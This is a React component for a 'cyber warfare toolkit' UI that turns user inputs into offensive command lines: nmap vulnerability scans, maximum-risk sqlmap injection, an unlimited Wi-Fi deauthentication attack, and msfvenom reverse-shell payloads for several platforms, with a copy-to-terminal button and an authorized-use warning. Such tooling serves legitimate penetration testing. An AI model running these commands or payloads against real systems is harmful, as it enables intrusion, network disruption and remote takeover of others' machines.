
import React, { useState } from 'react';

interface HackingToolkitProps {
  isOpen: boolean;
  onClose: () => void;
}

type ToolCategory = 'NETWORK' | 'WEB' | 'WIFI' | 'PAYLOAD';

export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose }) => {
  const [activeCategory, setActiveCategory] = useState<ToolCategory>('NETWORK');
  
  // Inputs State
  const [targetIp, setTargetIp] = useState('192.168.1.1');
  const [targetUrl, setTargetUrl] = useState('http://example.com/id=1');
  const [interfaceName, setInterfaceName] = useState('wlan0mon');
  const [lhost, setLhost] = useState('10.0.0.1');
  const [lport, setLport] = useState('4444');
  const [bssid, setBssid] = useState('00:11:22:33:44:55');
  
  // Options State
  const [nmapMode, setNmapMode] = useState('STEALTH'); // STEALTH, AGGRESSIVE, VULN
  const [payloadType, setPayloadType] = useState('windows/meterpreter/reverse_tcp');

  if (!isOpen) return null;

  const generateCommand = () => {
    switch (activeCategory) {
      case 'NETWORK':
        if (nmapMode === 'STEALTH') return `sudo nmap -sS -T4 -p- -v ${targetIp}`;
        if (nmapMode === 'AGGRESSIVE') return `sudo nmap -A -T4 -p- --script=default,vuln ${targetIp}`;
        if (nmapMode === 'VULN') return `sudo nmap --script=vuln -p80,443,8080,3306 ${targetIp}`;
        return '';
      case 'WEB':
        return `sqlmap -u "${targetUrl}" --random-agent --level=5 --risk=3 --dbs --batch --tamper=space2comment`;
      case 'WIFI':
        return `sudo aireplay-ng --deauth 0 -a ${bssid} ${interfaceName}`;
      case 'PAYLOAD':
        let ext = 'exe';
        if (payloadType.includes('php')) ext = 'php';
        if (payloadType.includes('android')) ext = 'apk';
        if (payloadType.includes('python')) ext = 'py';
        return `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f ${ext} > shell.${ext}`;
      default:
        return '';
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generateCommand());
    alert("Command copied to clipboard! Paste in your Terminal.");
  };

  return (
    <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/90 backdrop-blur-sm p-4">
      <div className="w-full max-w-4xl bg-black border border-cyber-matrix shadow-[0_0_30px_rgba(0,255,65,0.15)] rounded-lg flex flex-col overflow-hidden h-[80vh]">
        
        {/* Header */}
        <div className="bg-gray-900 p-4 border-b border-cyber-matrix/30 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <i className="fas fa-dragon text-cyber-matrix text-xl"></i>
            <h2 className="text-cyber-matrix font-mono text-lg font-bold tracking-wider">CYBER_WARFARE_TOOLKIT_v1.0</h2>
          </div>
          <button onClick={onClose} className="text-gray-500 hover:text-white transition-colors">
            <i className="fas fa-times text-xl"></i>
          </button>
        </div>

        <div className="flex flex-1 overflow-hidden">
          {/* Sidebar Menu */}
          <div className="w-48 bg-gray-900/50 border-r border-white/5 p-2 space-y-1">
            {(['NETWORK', 'WEB', 'WIFI', 'PAYLOAD'] as ToolCategory[]).map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className={`w-full text-left p-3 rounded font-mono text-xs font-bold transition-all ${
                  activeCategory === cat 
                    ? 'bg-cyber-matrix text-black shadow-[0_0_10px_rgba(0,255,65,0.4)]' 
                    : 'text-gray-400 hover:bg-white/5 hover:text-white'
                }`}
              >
                {cat}_OPS
              </button>
            ))}
          </div>

          {/* Main Content */}
          <div className="flex-1 p-6 overflow-y-auto bg-black/80 relative">
             {/* Background Grid */}
             <div className="absolute inset-0 opacity-5 pointer-events-none" 
                 style={{ backgroundImage: 'linear-gradient(0deg, transparent 24%, #0f0 25%, #0f0 26%, transparent 27%, transparent 74%, #0f0 75%, #0f0 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, #0f0 25%, #0f0 26%, transparent 27%, transparent 74%, #0f0 75%, #0f0 76%, transparent 77%, transparent)', backgroundSize: '40px 40px' }}>
            </div>

            <div className="relative z-10">
              <h3 className="text-white font-mono text-xl mb-6 border-b border-gray-700 pb-2">
                {activeCategory === 'NETWORK' && 'NMAP SCANNER BUILDER'}
                {activeCategory === 'WEB' && 'SQLMAP INJECTOR'}
                {activeCategory === 'WIFI' && 'AIRCRACK-NG SUITE'}
                {activeCategory === 'PAYLOAD' && 'MSFVENOM GENERATOR'}
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                
                {/* Inputs based on Category */}
                {activeCategory === 'NETWORK' && (
                  <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">TARGET IP / RANGE</label>
                      <input 
                        type="text" 
                        value={targetIp} 
                        onChange={(e) => setTargetIp(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">SCAN MODE</label>
                      <select 
                        value={nmapMode}
                        onChange={(e) => setNmapMode(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      >
                        <option value="STEALTH">STEALTH (SYN SCAN)</option>
                        <option value="AGGRESSIVE">AGGRESSIVE (OS + VERSION)</option>
                        <option value="VULN">VULNERABILITY SCAN</option>
                      </select>
                    </div>
                  </>
                )}

                {activeCategory === 'WEB' && (
                  <div className="col-span-2 space-y-2">
                    <label className="text-cyber-matrix text-xs font-bold">VULNERABLE URL</label>
                    <input 
                      type="text" 
                      value={targetUrl} 
                      onChange={(e) => setTargetUrl(e.target.value)}
                      className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                    />
                    <p className="text-[10px] text-gray-500">Example: http://testphp.vulnweb.com/artists.php?artist=1</p>
                  </div>
                )}

                {activeCategory === 'WIFI' && (
                  <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">TARGET BSSID (MAC)</label>
                      <input 
                        type="text" 
                        value={bssid} 
                        onChange={(e) => setBssid(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">MONITOR INTERFACE</label>
                      <input 
                        type="text" 
                        value={interfaceName} 
                        onChange={(e) => setInterfaceName(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                  </>
                )}

                {activeCategory === 'PAYLOAD' && (
                   <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">LHOST (YOUR IP)</label>
                      <input 
                        type="text" 
                        value={lhost} 
                        onChange={(e) => setLhost(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">LPORT</label>
                      <input 
                        type="text" 
                        value={lport} 
                        onChange={(e) => setLport(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="col-span-2 space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">PAYLOAD TYPE</label>
                      <select 
                        value={payloadType}
                        onChange={(e) => setPayloadType(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      >
                        <option value="windows/meterpreter/reverse_tcp">Windows Reverse TCP (Meterpreter)</option>
                        <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Reverse TCP</option>
                        <option value="php/meterpreter/reverse_tcp">PHP Web Payload</option>
                        <option value="android/meterpreter/reverse_tcp">Android APK Payload</option>
                        <option value="python/meterpreter/reverse_tcp">Python Script Payload</option>
                      </select>
                    </div>
                  </>
                )}

              </div>

              {/* Output Area */}
              <div className="bg-black border border-gray-800 rounded p-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-gray-400 text-xs font-mono">GENERATED_COMMAND_OUTPUT</span>
                  <button 
                    onClick={copyToClipboard}
                    className="text-xs bg-cyber-matrix text-black px-3 py-1 rounded font-bold hover:bg-white transition-colors"
                  >
                    <i className="fas fa-copy mr-1"></i> COPY
                  </button>
                </div>
                <div className="font-mono text-green-500 break-all bg-gray-900/50 p-3 rounded border border-green-900/30">
                  <span className="text-blue-400 mr-2">$</span>
                  {generateCommand()}
                </div>
              </div>
              
              <div className="mt-6 p-3 bg-red-900/20 border border-red-500/30 rounded text-xs text-red-300 font-mono flex items-start gap-3">
                <i className="fas fa-exclamation-triangle mt-0.5"></i>
                <div>
                  <strong>WARNING:</strong> These commands are real and powerful. Unauthorized use against systems you do not own is illegal. Use strictly for educational purposes or authorized penetration testing.
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
